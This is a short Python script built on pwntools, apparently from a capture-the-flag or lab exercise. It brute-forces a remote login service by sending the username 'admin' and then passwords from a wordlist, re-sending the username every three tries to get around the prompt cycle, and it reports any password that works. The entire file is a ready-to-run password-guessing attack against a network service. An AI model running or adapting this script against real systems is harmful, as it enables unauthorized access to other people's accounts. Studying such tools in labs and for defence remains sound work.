import sys
from pwn import *

def check_password(password) -> bool:
    print(f"[+] Checking password [{password}]...")
    target.sendline(password.encode())
    output = target.recvline(timeout=1).decode().strip()
    return output != "" and not output.startswith("Password:")

counter = 0
target = remote(sys.argv[1], int(sys.argv[2]))
with open(sys.argv[3], "r") as file:
    for line in file:
        if counter == 3:
            counter = 0
        if counter == 0:
            target.sendline("admin".encode())
            output = target.recvline().decode().strip()
        if check_password(line.strip()):
            print(f"[+] Password found: [{line.strip()}]")
            exit(0)
        counter += 1